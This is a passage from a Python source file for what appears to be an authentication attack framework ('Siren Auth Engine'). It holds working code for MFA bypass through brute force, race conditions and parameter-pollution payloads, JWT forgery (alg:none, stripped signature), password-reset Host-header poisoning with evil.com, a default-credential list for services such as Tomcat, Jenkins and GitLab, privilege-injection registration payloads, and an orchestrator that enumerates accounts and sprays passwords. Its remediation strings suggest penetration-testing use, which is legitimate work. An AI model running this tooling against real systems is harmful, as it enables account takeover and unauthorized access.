                if hasattr(client, "post"):
                    resp = await client.post(
                        endpoint,
                        data={"code": code},
                        headers={"Cookie": cookie_str},
                        allow_redirects=False,
                    )
                    status = getattr(resp, "status_code", 0) or getattr(
                        resp, "status", 0
                    )
                    if status == 429:
                        rate_limited = True
                        break
                    tested += 1
                await asyncio.sleep(0.1)
            except Exception as e:
                logger.warning("MFA rate-limit test error: %s", e, exc_info=True)
                break

        if not rate_limited and tested >= 5:
            return {
                "rate_limited": False,
                "tested": tested,
                "analysis": "No rate limiting detected — 4-digit brute force feasible",
            }

        return None

    async def _test_response_manipulation(
        self, endpoint: str, cookies: Dict[str, str], client: Any
    ) -> Optional[Dict]:
        """Test if MFA verification can be bypassed by manipulating response."""
        # This tests if the server relies on client-side MFA verification
        if not client:
            return {
                "analysis": (
                    "Check if MFA verification is done client-side. "
                    "Intercept response and change success:false to success:true"
                )
            }

        cookie_str = "; ".join(f"{k}={v}" for k, v in cookies.items())

        try:
            if hasattr(client, "post"):
                resp = await client.post(
                    endpoint,
                    data={"code": "000000"},
                    headers={"Cookie": cookie_str},
                    allow_redirects=False,
                )
                body = ""
                if hasattr(resp, "text"):
                    body = (
                        resp.text if isinstance(resp.text, str) else await resp.text()
                    )

                # Check if response contains client-side verification indicators
                client_side_indicators = [
                    "verified: false",
                    "success: false",
                    "valid: false",
                    '"verified":false',
                    '"success":false',
                    '"valid":false',
                    "mfa_verified = false",
                    "isVerified = false",
                ]
                for indicator in client_side_indicators:
                    if indicator in body:
                        return {
                            "indicator_found": indicator,
                            "analysis": "Client-side MFA verification detected",
                        }
        except Exception as e:
            logger.debug("Client-side MFA detection error: %s", e)

        return None

    async def _test_direct_access(
        self, endpoint: str, cookies: Dict[str, str], client: Any
    ) -> Optional[Dict]:
        """Test if post-MFA pages can be accessed directly."""
        if not client:
            return None

        # Common post-auth paths
        post_auth_paths = [
            "/dashboard",
            "/home",
            "/profile",
            "/account",
            "/admin",
            "/panel",
            "/api/user",
            "/api/me",
            "/settings",
            "/console",
            "/app",
        ]

        cookie_str = "; ".join(f"{k}={v}" for k, v in cookies.items())
        base_url = endpoint.rsplit("/", 1)[0] if "/" in endpoint else endpoint

        for path in post_auth_paths:
            try:
                url = f"{base_url}{path}"
                if hasattr(client, "get"):
                    resp = await client.get(
                        url,
                        headers={"Cookie": cookie_str},
                        allow_redirects=False,
                    )
                    status = getattr(resp, "status_code", 0) or getattr(
                        resp, "status", 0
                    )
                    if status == 200:
                        body = ""
                        if hasattr(resp, "text"):
                            body = (
                                resp.text
                                if isinstance(resp.text, str)
                                else await resp.text()
                            )
                        # Check if we got actual content (not login redirect)
                        if len(body) > 500 and "login" not in body.lower()[:200]:
                            return {
                                "path": path,
                                "status": status,
                                "analysis": f"Post-MFA page accessible at {path}",
                            }
            except Exception:
                continue

        return None

    async def _test_backup_code_brute(
        self, endpoint: str, cookies: Dict[str, str], client: Any
    ) -> Optional[Dict]:
        """Test if backup codes endpoint is brute-forceable."""
        if not client:
            return {
                "analysis": "Backup codes are typically 8 alphanumeric chars — check rate limiting"
            }

        # Check if there's a separate backup code endpoint
        base = endpoint.rsplit("/", 1)[0]
        backup_endpoints = [
            f"{base}/backup-code",
            f"{base}/recovery-code",
            f"{base}/backup",
            f"{endpoint}?method=backup",
        ]

        cookie_str = "; ".join(f"{k}={v}" for k, v in cookies.items())

        for backup_ep in backup_endpoints:
            try:
                if hasattr(client, "post"):
                    resp = await client.post(
                        backup_ep,
                        data={"code": "AAAA-AAAA"},
                        headers={"Cookie": cookie_str},
                    )
                    status = getattr(resp, "status_code", 0) or getattr(
                        resp, "status", 0
                    )
                    if status != 404:
                        return {
                            "backup_endpoint": backup_ep,
                            "status": status,
                            "analysis": f"Backup code endpoint found at {backup_ep}",
                        }
            except Exception:
                continue

        return None

    async def _test_race_condition(
        self, endpoint: str, cookies: Dict[str, str], client: Any
    ) -> Optional[Dict]:
        """Test for race condition in MFA verification."""
        if not client:
            return {
                "analysis": (
                    "Send multiple MFA verification requests simultaneously. "
                    "If one succeeds, the others might bypass rate limits."
                )
            }

        cookie_str = "; ".join(f"{k}={v}" for k, v in cookies.items())

        # Send multiple requests simultaneously
        async def _send_code(code: str):
            try:
                if hasattr(client, "post"):
                    resp = await client.post(
                        endpoint,
                        data={"code": code},
                        headers={"Cookie": cookie_str},
                        allow_redirects=False,
                    )
                    return {
                        "code": code,
                        "status": getattr(resp, "status_code", 0)
                        or getattr(resp, "status", 0),
                    }
            except Exception:
                return None

        # Send 10 codes simultaneously
        codes = [f"{i:06d}" for i in range(10)]
        results = await asyncio.gather(*[_send_code(c) for c in codes])
        valid_results = [r for r in results if r]

        if valid_results:
            statuses = [r["status"] for r in valid_results]
            # If no 429 in any response, race condition may work
            if 429 not in statuses:
                return {
                    "codes_sent": len(codes),
                    "responses": valid_results,
                    "analysis": "No rate limiting during concurrent requests",
                }

        return None

    async def _test_param_pollution(
        self, endpoint: str, cookies: Dict[str, str], client: Any
    ) -> Optional[Dict]:
        """Test HTTP parameter pollution for MFA bypass."""
        if not client:
            return None

        cookie_str = "; ".join(f"{k}={v}" for k, v in cookies.items())

        pollution_payloads = [
            # Duplicate parameter
            "code=000000&code=999999",
            "code[]=000000&code[]=999999",
            # Array injection
            "code=000000&verified=true",
            "code=000000&mfa_verified=true",
            "code=000000&step=3",
            "code=000000&bypass=true",
            # Type confusion
            "code[code]=000000",
            "code=true",
        ]

        for payload in pollution_payloads:
            try:
                if hasattr(client, "post"):
                    resp = await client.post(
                        endpoint,
                        data=payload,
                        headers={
                            "Cookie": cookie_str,
                            "Content-Type": "application/x-www-form-urlencoded",
                        },
                        allow_redirects=False,
                    )
                    status = getattr(resp, "status_code", 0) or getattr(
                        resp, "status", 0
                    )
                    if status in (200, 301, 302, 303):
                        body = ""
                        if hasattr(resp, "text"):
                            body = (
                                resp.text
                                if isinstance(resp.text, str)
                                else await resp.text()
                            )
                        if self._is_mfa_bypassed(
                            status, body, dict(getattr(resp, "headers", {}))
                        ):
                            return {"payload": payload, "status": status}
            except Exception:
                continue

        return None

    def _is_mfa_bypassed(self, status: int, body: str, headers: Dict[str, str]) -> bool:
        """Check if MFA was successfully bypassed."""
        body_lower = body.lower()

        # Redirect to post-auth page
        if status in (301, 302, 303):
            location = headers.get("Location", "").lower()
            if any(
                kw in location
                for kw in [
                    "dashboard",
                    "home",
                    "profile",
                    "account",
                    "welcome",
                ]
            ):
                return True
            if any(kw in location for kw in ["mfa", "2fa", "verify", "login"]):
                return False
            return True

        # 200 with dashboard/profile content
        if status == 200:
            if any(
                kw in body_lower
                for kw in [
                    "welcome back",
                    "dashboard",
                    "my account",
                    "logout",
                    "sign out",
                    "profile",
                ]
            ):
                return True
            if any(
                kw in body_lower
                for kw in [
                    "verification code",
                    "enter code",
                    "mfa",
                    "two-factor",
                    "authenticate",
                ]
            ):
                return False

        return False


# ═══════════════════════════════════════════════════════════════
#  TOKEN REPLAY ENGINE
# ═══════════════════════════════════════════════════════════════


class TokenReplayEngine:
    """Test for token replay and refresh token abuse."""

    def __init__(self):
        self.replayed_tokens: List[Dict[str, Any]] = []

    async def test_token_replay(
        self,
        api_url: str,
        token: str,
        token_type: str = "Bearer",
        http_client: Any = None,
    ) -> AuthAttackResult:
        """Test if expired/revoked tokens are still accepted."""
        result = AuthAttackResult(
            attack_type=AuthAttackType.TOKEN_REPLAY,
            target=api_url,
        )
        start = time.time()

        tests = [
            ("original_token", token),
            ("modified_exp", self._modify_jwt_expiry(token)),
            ("stripped_signature", self._strip_jwt_signature(token)),
            ("none_algorithm", self._none_algorithm_attack(token)),
            ("empty_payload", self._empty_jwt_payload(token)),
        ]

        for test_name, test_token in tests:
            if not test_token:
                continue

            try:
                if http_client and hasattr(http_client, "get"):
                    resp = await http_client.get(
                        api_url,
                        headers={"Authorization": f"{token_type} {test_token}"},
                    )
                    status = getattr(resp, "status_code", 0) or getattr(
                        resp, "status", 0
                    )
                    body = ""
                    if hasattr(resp, "text"):
                        body = (
                            resp.text
                            if isinstance(resp.text, str)
                            else await resp.text()
                        )

                    accepted = status in (200, 201, 204)
                    result.evidence[test_name] = {
                        "accepted": accepted,
                        "status": status,
                        "response_length": len(body),
                    }

                    if accepted and test_name != "original_token":
                        self.replayed_tokens.append(
                            {
                                "technique": test_name,
                                "token": test_token[:50] + "...",
                                "status": status,
                            }
                        )

                result.attempts += 1

            except Exception as e:
                logger.debug(f"Token replay test error: {e}")

        result.success = len(self.replayed_tokens) > 0
        result.duration = time.time() - start
        result.details = (
            f"Tested {result.attempts} token replay techniques, "
            f"found {len(self.replayed_tokens)} accepted"
        )
        result.severity = "critical" if result.success else "info"
        result.remediation = (
            "Implement proper token validation including signature verification. "
            "Check token expiration server-side. "
            "Maintain a token blacklist for revoked tokens. "
            "Never accept tokens with 'none' algorithm."
        )
        return result

    def _modify_jwt_expiry(self, token: str) -> Optional[str]:
        """Modify JWT expiry to far future."""
        try:
            parts = token.split(".")
            if len(parts) != 3:
                return None

            # Decode payload
            payload_b64 = parts[1] + "=" * (4 - len(parts[1]) % 4)
            payload = json.loads(base64.urlsafe_b64decode(payload_b64))

            # Set expiry to 10 years from now
            payload["exp"] = int(time.time()) + (10 * 365 * 24 * 3600)
            payload["iat"] = int(time.time())

            # Re-encode (keeping original signature — should be rejected)
            new_payload = (
                base64.urlsafe_b64encode(json.dumps(payload).encode())
                .rstrip(b"=")
                .decode()
            )

            return f"{parts[0]}.{new_payload}.{parts[2]}"
        except Exception:
            return None

    def _strip_jwt_signature(self, token: str) -> Optional[str]:
        """Strip JWT signature (alg:none attack variant)."""
        try:
            parts = token.split(".")
            if len(parts) != 3:
                return None
            return f"{parts[0]}.{parts[1]}."
        except Exception:
            return None

    def _none_algorithm_attack(self, token: str) -> Optional[str]:
        """JWT 'none' algorithm attack."""
        try:
            parts = token.split(".")
            if len(parts) < 2:
                return None

            # Create header with alg:none
            header = {"alg": "none", "typ": "JWT"}
            header_b64 = (
                base64.urlsafe_b64encode(json.dumps(header).encode())
                .rstrip(b"=")
                .decode()
            )

            return f"{header_b64}.{parts[1]}."
        except Exception:
            return None

    def _empty_jwt_payload(self, token: str) -> Optional[str]:
        """JWT with empty payload."""
        try:
            parts = token.split(".")
            if len(parts) < 1:
                return None

            empty_payload = base64.urlsafe_b64encode(b"{}").rstrip(b"=").decode()

            return f"{parts[0]}.{empty_payload}.invalid"
        except Exception:
            return None


# ═══════════════════════════════════════════════════════════════
#  PASSWORD RESET POISON
# ═══════════════════════════════════════════════════════════════


class PasswordResetPoison:
    """Test for password reset poisoning vulnerabilities."""

    def __init__(self):
        self.vulnerabilities: List[Dict[str, Any]] = []

    async def test_host_header_poison(
        self,
        reset_endpoint: str,
        target_email: str,
        evil_domain: str = "evil.com",
        http_client: Any = None,
    ) -> AuthAttackResult:
        """Test Host header poisoning in password reset."""
        result = AuthAttackResult(
            attack_type=AuthAttackType.RESET_POISON,
            target=reset_endpoint,
        )
        start = time.time()

        poison_headers = [
            {"Host": evil_domain},
            {"Host": evil_domain, "X-Forwarded-Host": evil_domain},
            {"X-Forwarded-Host": evil_domain},
            {"X-Original-URL": f"https://{evil_domain}/reset"},
            {"X-Rewrite-URL": f"https://{evil_domain}/reset"},
            {"X-Forwarded-Server": evil_domain},
            {"X-Host": evil_domain},
            {"X-HTTP-Host-Override": evil_domain},
            {"Forwarded": f"host={evil_domain}"},
            {"X-Forwarded-For": evil_domain},
        ]

        for headers in poison_headers:
            try:
                data = {"email": target_email}

                if http_client and hasattr(http_client, "post"):
                    resp = await http_client.post(
                        reset_endpoint,
                        data=data,
                        headers=headers,
                        allow_redirects=False,
                    )
                    status = getattr(resp, "status_code", 0) or getattr(
                        resp, "status", 0
                    )
                    body = ""
                    if hasattr(resp, "text"):
                        body = (
                            resp.text
                            if isinstance(resp.text, str)
                            else await resp.text()
                        )

                    # If server accepts the request without error,
                    # the reset link may contain our evil domain
                    if status in (200, 201, 202, 204):
                        if "error" not in body.lower()[:200]:
                            vuln = {
                                "headers": headers,
                                "status": status,
                                "analysis": (
                                    "Reset email may contain poisoned link. "
                                    "Check if reset URL uses attacker's domain."
                                ),
                            }
                            self.vulnerabilities.append(vuln)
                            result.evidence.setdefault("accepted_poisons", []).append(
                                vuln
                            )

                result.attempts += 1
                await asyncio.sleep(random.uniform(0.2, 0.5))

            except Exception as e:
                logger.debug(f"Reset poison test error: {e}")

        result.success = len(self.vulnerabilities) > 0
        result.duration = time.time() - start
        result.details = (
            f"Tested {len(poison_headers)} Host header poisons, "
            f"{len(self.vulnerabilities)} potentially accepted"
        )
        result.severity = "high" if result.success else "info"
        result.remediation = (
            "Use a hardcoded domain for password reset links. "
            "Never use the Host header to construct URLs. "
            "Validate and sanitize all host-related headers. "
            "Use a server-side configuration for the application URL."
        )
        return result

    async def test_reset_token_reuse(
        self,
        reset_confirm_endpoint: str,
        token: str,
        http_client: Any = None,
    ) -> AuthAttackResult:
        """Test if password reset tokens can be reused."""
        result = AuthAttackResult(
            attack_type=AuthAttackType.RESET_POISON,
            target=reset_confirm_endpoint,
        )
        start = time.time()

        if http_client:
            # First use
            try:
                if hasattr(http_client, "post"):
                    resp1 = await http_client.post(
                        reset_confirm_endpoint,
                        data={
                            "token": token,
                            "password": "NewP@ss1!",
                            "confirm": "NewP@ss1!",
                        },
                    )
                    status1 = getattr(resp1, "status_code", 0) or getattr(
                        resp1, "status", 0
                    )

                    # Try to reuse the same token
                    await asyncio.sleep(0.5)
                    resp2 = await http_client.post(
                        reset_confirm_endpoint,
                        data={
                            "token": token,
                            "password": "NewP@ss2!",
                            "confirm": "NewP@ss2!",
                        },
                    )
                    status2 = getattr(resp2, "status_code", 0) or getattr(
                        resp2, "status", 0
                    )

                    if status2 in (200, 201, 204):
                        result.success = True
                        result.evidence["reuse_possible"] = True
                        result.details = "Reset token can be reused"
                        result.severity = "high"
                    else:
                        result.evidence["reuse_possible"] = False
                        result.details = "Reset token properly invalidated after use"
            except Exception as e:
                result.details = f"Token reuse test error: {e}"

        result.duration = time.time() - start
        result.remediation = (
            "Invalidate reset tokens immediately after use. "
            "Set short expiration times (15-30 minutes). "
            "Use single-use tokens with server-side tracking."
        )
        return result


# ═══════════════════════════════════════════════════════════════
#  DEFAULT CREDENTIALS SCANNER
# ═══════════════════════════════════════════════════════════════


class DefaultCredentialScanner:
    """Scan for default credentials on known services."""

    SERVICE_CREDS = {
        "tomcat": [
            ("/manager/html", "admin", "admin"),
            ("/manager/html", "tomcat", "tomcat"),
            ("/manager/html", "admin", "tomcat"),
            ("/manager/html", "tomcat", "s3cret"),
            ("/manager/html", "admin", ""),
            ("/host-manager/html", "admin", "admin"),
        ],
        "jenkins": [
            ("/login", "admin", "admin"),
            ("/login", "admin", "password"),
            ("/login", "admin", "jenkins"),
            ("/j_acegi_security_check", "admin", "admin"),
        ],
        "grafana": [
            ("/login", "admin", "admin"),
            ("/login", "admin", "grafana"),
            ("/api/login", "admin", "admin"),
        ],
        "elasticsearch": [
            ("/", "elastic", "changeme"),
            ("/", "elastic", "elastic"),
            ("/_security/_authenticate", "elastic", "changeme"),
        ],
        "kibana": [
            ("/login", "elastic", "changeme"),
            ("/api/security/v1/login", "elastic", "changeme"),
        ],
        "rabbitmq": [
            ("/api/whoami", "guest", "guest"),
            ("/api/whoami", "admin", "admin"),
        ],
        "mongodb": [
            ("/", "admin", ""),
            ("/", "admin", "admin"),
            ("/", "root", ""),
        ],
        "redis": [
            ("/", "", ""),
            ("/", "", "redis"),
        ],
        "wordpress": [
            ("/wp-login.php", "admin", "admin"),
            ("/wp-login.php", "admin", "password"),
            ("/wp-login.php", "admin", "wordpress"),
        ],
        "phpmyadmin": [
            ("/", "root", ""),
            ("/", "root", "root"),
            ("/", "root", "mysql"),
            ("/", "root", "password"),
        ],
        "jira": [
            ("/login.jsp", "admin", "admin"),
            ("/rest/auth/1/session", "admin", "admin"),
        ],
        "gitlab": [
            ("/users/sign_in", "root", "5iveL!fe"),
            ("/users/sign_in", "admin", "admin"),
        ],
        "sonarqube": [
            ("/api/authentication/login", "admin", "admin"),
        ],
        "nexus": [
            ("/service/rest/v1/status", "admin", "admin123"),
        ],
        "portainer": [
            ("/api/auth", "admin", "admin"),
        ],
        "pgadmin": [
            ("/login", "admin@admin.com", "admin"),
            ("/login", "postgres@localhost", "postgres"),
        ],
        "minio": [
            ("/minio/login", "minioadmin", "minioadmin"),
        ],
        "zabbix": [
            ("/index.php", "Admin", "zabbix"),
        ],
        "nagios": [
            ("/nagios/", "nagiosadmin", "nagiosadmin"),
            ("/nagios/", "nagiosadmin", "nagios"),
        ],
    }

    def __init__(self):
        self.found: List[Credential] = []

    async def scan_defaults(
        self,
        base_url: str,
        services: Optional[List[str]] = None,
        http_client: Any = None,
    ) -> AuthAttackResult:
        """Scan target for default credentials."""
        result = AuthAttackResult(
            attack_type=AuthAttackType.DEFAULT_CREDS,
            target=base_url,
        )
        start = time.time()

        if services is None:
            services = list(self.SERVICE_CREDS.keys())

        for service in services:
            creds = self.SERVICE_CREDS.get(service, [])
            for path, username, password in creds:
                try:
                    url = f"{base_url.rstrip('/')}{path}"

                    if http_client and hasattr(http_client, "post"):
                        # Try form login
                        resp = await http_client.post(
                            url,
                            data={"username": username, "password": password},
                            allow_redirects=False,
                        )
                        status = getattr(resp, "status_code", 0) or getattr(
                            resp, "status", 0
                        )

                        if status in (200, 301, 302, 303):
                            body = ""
                            if hasattr(resp, "text"):
                                body = (
                                    resp.text
                                    if isinstance(resp.text, str)
                                    else await resp.text()
                                )
                            # Check for success indicators
                            if self._is_login_success(
                                status, body, dict(getattr(resp, "headers", {}))
                            ):
                                cred = Credential(
                                    username=username,
                                    password=password,
                                    source=f"default_{service}",
                                    valid=True,
                                    status_code=status,
                                )
                                self.found.append(cred)
                                result.credentials.append(cred)

                        # Also try Basic auth
                        auth_str = base64.b64encode(
                            f"{username}:{password}".encode()
                        ).decode()
                        resp2 = await http_client.get(
                            url,
                            headers={"Authorization": f"Basic {auth_str}"},
                        )
                        status2 = getattr(resp2, "status_code", 0) or getattr(
                            resp2, "status", 0
                        )
                        if status2 in (200, 201, 204):
                            cred = Credential(
                                username=username,
                                password=password,
                                source=f"default_{service}_basic",
                                valid=True,
                                status_code=status2,
                            )
                            self.found.append(cred)
                            result.credentials.append(cred)
                    else:
                        # Dry run — just list what would be tested
                        result.credentials.append(
                            Credential(
                                username=username,
                                password=password,
                                source=f"default_{service}_dry",
                            )
                        )

                    result.attempts += 1
                    await asyncio.sleep(random.uniform(0.05, 0.2))

                except Exception as e:
                    logger.debug(f"Default cred test error: {e}")

        result.success = any(c.valid for c in result.credentials)
        result.duration = time.time() - start
        result.details = (
            f"Scanned {len(services)} services, "
            f"tested {result.attempts} credential pairs, "
            f"found {len(self.found)} valid defaults"
        )
        result.severity = "critical" if result.success else "info"
        result.remediation = (
            "Change all default credentials immediately. "
            "Enforce strong password policies. "
            "Disable default accounts where possible. "
            "Implement account auditing."
        )
        return result

    def _is_login_success(
        self, status: int, body: str, headers: Dict[str, str]
    ) -> bool:
        """Check if login was successful."""
        body_lower = body.lower()

        if status in (301, 302, 303):
            location = headers.get("Location", "").lower()
            if any(kw in location for kw in ["dashboard", "home", "admin", "panel"]):
                return True
            if any(kw in location for kw in ["login", "error", "failed"]):
                return False
            return True

        if status == 200:
            fail_indicators = [
                "invalid",
                "failed",
                "incorrect",
                "wrong",
                "error",
                "denied",
                "unauthorized",
            ]
            for f in fail_indicators:
                if f in body_lower[:500]:
                    return False

            success_indicators = [
                "welcome",
                "dashboard",
                "logout",
                "sign out",
                "profile",
                "settings",
            ]
            for s in success_indicators:
                if s in body_lower:
                    return True

        return False


# ═══════════════════════════════════════════════════════════════
#  REGISTRATION ABUSE ENGINE
# ═══════════════════════════════════════════════════════════════


class RegistrationAbuseEngine:
    """Test for account registration abuse vulnerabilities."""

    def __init__(self):
        self.vulnerabilities: List[Dict[str, Any]] = []

    async def test_registration_abuse(
        self,
        register_endpoint: str,
        http_client: Any = None,
    ) -> AuthAttackResult:
        """Test for various registration abuse vectors."""
        result = AuthAttackResult(
            attack_type=AuthAttackType.REGISTRATION_ABUSE,
            target=register_endpoint,
        )
        start = time.time()

        abuse_tests = [
            ("duplicate_email_case", self._test_case_sensitivity),
            ("email_normalization", self._test_email_normalization),
            ("admin_role_injection", self._test_role_injection),
            ("mass_registration", self._test_mass_registration),
            ("weak_password_accept", self._test_weak_password),
            ("email_verification_bypass", self._test_verification_bypass),
        ]

        for test_name, test_func in abuse_tests:
            try:
                vuln = await test_func(register_endpoint, http_client)
                if vuln:
                    self.vulnerabilities.append(
                        {
                            "test": test_name,
                            "details": vuln,
                        }
                    )
                    result.evidence[test_name] = vuln
                result.attempts += 1
            except Exception as e:
                logger.debug(f"Registration test '{test_name}' error: {e}")

        result.success = len(self.vulnerabilities) > 0
        result.duration = time.time() - start
        result.details = (
            f"Tested {len(abuse_tests)} registration abuse vectors, "
            f"found {len(self.vulnerabilities)} issues"
        )
        result.severity = "high" if result.success else "info"
        result.remediation = (
            "Normalize email addresses before storage. "
            "Implement CAPTCHA on registration. "
            "Rate-limit registration attempts. "
            "Validate and sanitize all registration fields. "
            "Never allow role assignment via registration parameters."
        )
        return result

    async def _test_case_sensitivity(
        self, endpoint: str, client: Any
    ) -> Optional[Dict]:
        """Test if email case is handled properly."""
        if not client:
            return {
                "analysis": (
                    "Register with admin@target.com and ADMIN@TARGET.COM — "
                    "if both succeed, case sensitivity issue exists"
                )
            }

        rand_id = random.randint(10000, 99999)
        email1 = f"test{rand_id}@example.com"
        email2 = f"TEST{rand_id}@EXAMPLE.COM"

        results = {}
        for email in [email1, email2]:
            try:
                if hasattr(client, "post"):
                    resp = await client.post(
                        endpoint,
                        data={
                            "email": email,
                            "username": f"test_{rand_id}",
                            "password": "T3stP@ss123!",
                        },
                    )
                    status = getattr(resp, "status_code", 0) or getattr(
                        resp, "status", 0
                    )
                    results[email] = status
            except Exception as e:
                logger.debug("Registration enumeration error: %s", e)

        if len(results) == 2 and all(s in (200, 201) for s in results.values()):
            return {"both_accepted": True, "emails": list(results.keys())}

        return None

    async def _test_email_normalization(
        self, endpoint: str, client: Any
    ) -> Optional[Dict]:
        """Test email normalization issues."""
        if not client:
            return {
                "analysis": (
                    "Test with victim+tag@target.com, victim@target.com, "
                    "v.i.c.t.i.m@gmail.com variations"
                )
            }

        rand_id = random.randint(10000, 99999)
        emails = [
            f"test{rand_id}@example.com",
            f"test{rand_id}+admin@example.com",
            f"t.e.s.t{rand_id}@example.com",
            f"test{rand_id}@example.com ",  # trailing space
            f" test{rand_id}@example.com",  # leading space
        ]

        accepted = []
        for email in emails:
            try:
                if hasattr(client, "post"):
                    resp = await client.post(
                        endpoint,
                        data={
                            "email": email,
                            "username": f"test_{rand_id}_{len(accepted)}",
                            "password": "T3stP@ss123!",
                        },
                    )
                    status = getattr(resp, "status_code", 0) or getattr(
                        resp, "status", 0
                    )
                    if status in (200, 201):
                        accepted.append(email)
            except Exception as e:
                logger.debug("Email acceptance test error: %s", e)

        if len(accepted) > 1:
            return {"multiple_accepted": accepted}
        return None

    async def _test_role_injection(self, endpoint: str, client: Any) -> Optional[Dict]:
        """Test for role/privilege injection via registration."""
        if not client:
            return {
                "analysis": (
                    "Add role=admin, is_admin=true, isAdmin=1, "
                    "role_id=1, group=administrators to registration request"
                )
            }

        rand_id = random.randint(10000, 99999)
        injection_params = [
            {"role": "admin"},
            {"is_admin": "true"},
            {"isAdmin": "1"},
            {"admin": "true"},
            {"role_id": "1"},
            {"group": "administrators"},
            {"type": "admin"},
            {"user_type": "administrator"},
            {"privilege": "admin"},
            {"access_level": "99"},
        ]

        for params in injection_params:
            try:
                data = {
                    "email": f"test{rand_id}@example.com",
                    "username": f"test_{rand_id}",
                    "password": "T3stP@ss123!",
                    **params,
                }
                if hasattr(client, "post"):
                    resp = await client.post(endpoint, data=data)
                    status = getattr(resp, "status_code", 0) or getattr(
                        resp, "status", 0
                    )
                    if status in (200, 201):
                        body = ""
                        if hasattr(resp, "text"):
                            body = (
                                resp.text
                                if isinstance(resp.text, str)
                                else await resp.text()
                            )
                        if "admin" in body.lower() or "administrator" in body.lower():
                            return {"injected_params": params, "status": status}
            except Exception:
                continue

        return None

    async def _test_mass_registration(
        self, endpoint: str, client: Any
    ) -> Optional[Dict]:
        """Test if mass registration is rate-limited."""
        if not client:
            return {"analysis": "Test rapid registration of multiple accounts"}

        success_count = 0
        start = time.time()

        for i in range(10):
            rand_id = random.randint(100000, 999999)
            try:
                if hasattr(client, "post"):
                    resp = await client.post(
                        endpoint,
                        data={
                            "email": f"mass{rand_id}@example.com",
                            "username": f"mass_{rand_id}",
                            "password": "T3stP@ss123!",
                        },
                    )
                    status = getattr(resp, "status_code", 0) or getattr(
                        resp, "status", 0
                    )
                    if status in (200, 201):
                        success_count += 1
                    elif status == 429:
                        return None  # Rate limited
            except Exception as e:
                logger.debug("Rate limit test error: %s", e)

        elapsed = time.time() - start
        if success_count >= 8:
            return {
                "registrations_per_second": (
                    success_count / elapsed if elapsed > 0 else 0
                ),
                "total_registered": success_count,
                "analysis": "No rate limiting on registration",
            }

        return None

    async def _test_weak_password(self, endpoint: str, client: Any) -> Optional[Dict]:
        """Test if weak passwords are accepted."""
        if not client:
            return None

        weak_passwords = ["1", "123", "password", "a", "abc", "test"]
        accepted = []

        for pwd in weak_passwords:
            rand_id = random.randint(100000, 999999)
            try:
                if hasattr(client, "post"):
                    resp = await client.post(
                        endpoint,
                        data={
                            "email": f"weak{rand_id}@example.com",
                            "username": f"weak_{rand_id}",
                            "password": pwd,
                        },
                    )
                    status = getattr(resp, "status_code", 0) or getattr(
                        resp, "status", 0
                    )
                    if status in (200, 201):
                        accepted.append(pwd)
            except Exception:
                continue

        if accepted:
            return {"weak_passwords_accepted": accepted}
        return None

    async def _test_verification_bypass(
        self, endpoint: str, client: Any
    ) -> Optional[Dict]:
        """Test if email verification can be bypassed."""
        # This is an analysis-only test
        return {
            "analysis": (
                "After registration, check if account is immediately active. "
                "Try accessing protected resources before email verification. "
                "Check if verification token is predictable or brute-forceable."
            )
        }


# ═══════════════════════════════════════════════════════════════
#  SIREN AUTH ENGINE — MAIN ORCHESTRATOR
# ═══════════════════════════════════════════════════════════════


class SirenAuthEngine:
    """
    Master authentication attack engine.
    Orchestrates all auth attack modules.
    """

    def __init__(self, http_client: Any = None):
        self.http_client = http_client
        self.fingerprinter = AuthFingerprinter()
        self.results: List[AuthAttackResult] = []
        self._attack_registry: Dict[AuthAttackType, Any] = {}

    async def full_auth_audit(
        self,
        target: str,
        login_url: Optional[str] = None,
        usernames: Optional[List[str]] = None,
        passwords: Optional[List[str]] = None,
        oauth_config: Optional[Dict[str, str]] = None,
        mfa_endpoint: Optional[str] = None,
        token: Optional[str] = None,
        register_url: Optional[str] = None,
        reset_url: Optional[str] = None,
    ) -> Dict[str, Any]:
        """Run comprehensive authentication audit."""
        start = time.time()

        usernames = usernames or DEFAULT_USERNAMES[:20]
        passwords = passwords or DEFAULT_PASSWORDS[:20]

        audit_results: Dict[str, Any] = {
            "target": target,
            "start_time": time.strftime("%Y-%m-%d %H:%M:%S"),
            "modules": {},
        }

        # Phase 1: Fingerprint
        logger.info("[SIREN AUTH] Phase 1: Authentication Fingerprinting")
        try:
            url = login_url or target
            fp = await self.fingerprinter.fingerprint(url, self.http_client)
            audit_results["fingerprint"] = {
                "mechanism": fp.mechanism.value,
                "login_url": fp.login_url,
                "username_field": fp.username_field,
                "password_field": fp.password_field,
                "csrf_protected": fp.csrf_field is not None,
                "mfa_type": fp.mfa_type.value,
                "rate_limit": fp.rate_limit,
            }
        except Exception as e:
            logger.error(f"Fingerprint error: {e}")
            fp = AuthFingerprint()
            fp.login_url = login_url or target

        # Phase 2: Account Enumeration
        logger.info("[SIREN AUTH] Phase 2: Account Enumeration")
        try:
            enumerator = AccountEnumerator(fp)
            enum_result = await enumerator.enumerate(
                usernames, self.http_client, method="all"
            )
            self.results.append(enum_result)
            audit_results["modules"]["account_enum"] = {
                "success": enum_result.success,
                "valid_users": [c.username for c in enum_result.credentials if c.valid],
                "details": enum_result.details,
            }
            # Use found users for subsequent attacks
            if enum_result.credentials:
                usernames = [
                    c.username for c in enum_result.credentials if c.valid
                ] or usernames
        except Exception as e:
            logger.error(f"Enumeration error: {e}")

        # Phase 3: Default Credentials
        logger.info("[SIREN AUTH] Phase 3: Default Credential Scan")
        try:
            default_scanner = DefaultCredentialScanner()
            default_result = await default_scanner.scan_defaults(
                target, http_client=self.http_client
            )
            self.results.append(default_result)
            audit_results["modules"]["default_creds"] = {
                "success": default_result.success,
                "found": [
                    {
                        "user": c.username,
                        "pass": c.password[:3] + "***",
                        "service": c.source,
                    }
                    for c in default_result.credentials
                    if c.valid
                ],
                "details": default_result.details,
            }
        except Exception as e:
            logger.error(f"Default cred scan error: {e}")

        # Phase 4: Password Spray
        logger.info("[SIREN AUTH] Phase 4: Password Spray")
        try:
            sprayer = PasswordSprayer(fp, spray_delay=5.0)
            spray_result = await sprayer.spray(
                usernames[:10], passwords[:5], self.http_client
            )
            self.results.append(spray_result)
            audit_results["modules"]["password_spray"] = {
                "success": spray_result.success,
                "found": len(spray_result.credentials),
                "details": spray_result.details,
            }
        except Exception as e:
            logger.error(f"Spray error: {e}")

        # Phase 5: Session Analysis
        logger.info("[SIREN AUTH] Phase 5: Session Analysis")
        try:
            session_analyzer = SessionAnalyzer()
            session_result = await session_analyzer.analyze_session(
                login_url or target, self.http_client, sample_count=10
            )
            self.results.append(session_result)
            audit_results["modules"]["session_analysis"] = {
                "success": session_result.success,
                "tokens_analyzed": len(session_result.sessions),
                "details": session_result.details,
